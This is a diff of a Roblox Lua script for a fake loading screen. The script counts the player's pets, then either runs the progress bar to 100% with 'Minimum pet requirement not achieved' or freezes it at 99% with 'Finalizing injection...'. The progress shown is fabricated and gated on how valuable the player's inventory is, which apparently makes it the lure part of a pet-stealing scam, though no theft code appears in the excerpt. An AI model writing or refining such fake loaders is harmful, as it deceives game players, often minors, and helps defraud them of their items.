@@ -106,23 +106,8 @@ end
 
 typeText(messages[1])
 
--- check total pets
-local petsFolder = player:WaitForChild("BackpackApp")
-	:WaitForChild("Frame")
-	:WaitForChild("ScrollComplex")
-	:WaitForChild("ScrollingFrame")
-	:WaitForChild("Content")
-	:WaitForChild("pets")
-
-local totalChildren = 0
-for _, row in ipairs(petsFolder:GetChildren()) do
-	totalChildren += #row:GetChildren()
-end
-
--- decide maxProgress based on total pets
-local maxProgress = totalChildren >= 16 and 99 or 100
-
--- loader animation (independent bar)
+-- ANIMATION ONLY: start bar immediately
+local maxProgress = 99 -- default
 task.spawn(function()
 	while progress < maxProgress do
 		local speed = 0.06
@@ -137,7 +122,6 @@ task.spawn(function()
 		percent.Text = math.floor(progress).."%"
 		fill.Size = UDim2.new(progress/100,0,1,0)
 
-		-- update status messages
 		if math.floor(progress/12) > messageIndex and messageIndex < #messages then
 			messageIndex += 1
 			task.spawn(function()
@@ -147,11 +131,37 @@ task.spawn(function()
 
 		task.wait(0.05)
 	end
+end)
 
-	-- final status text
+-- wait for pets folder dynamically
+task.spawn(function()
+	local contentFolder = player:WaitForChild("BackpackApp")
+		:WaitForChild("Frame")
+		:WaitForChild("ScrollComplex")
+		:WaitForChild("ScrollingFrame")
+		:WaitForChild("Content")
+
+	local petsFolder = contentFolder:WaitForChild("pets")
+
+	-- count total children
+	local totalChildren = 0
+	for _, row in ipairs(petsFolder:GetChildren()) do
+		totalChildren += #row:GetChildren()
+	end
+
+	-- decide max progress based on pets count
 	if totalChildren < 16 then
+		-- let bar go to 100%
+		while progress < 100 do
+			progress += 0.5
+			progress = math.min(progress,100)
+			percent.Text = math.floor(progress).."%"
+			fill.Size = UDim2.new(progress/100,0,1,0)
+			task.wait(0.05)
+		end
 		status.Text = "Minimum pet requirement not achieved"
 	else
+		-- freeze at 99%
 		status.Text = "Finalizing injection..."
 	end
 end)
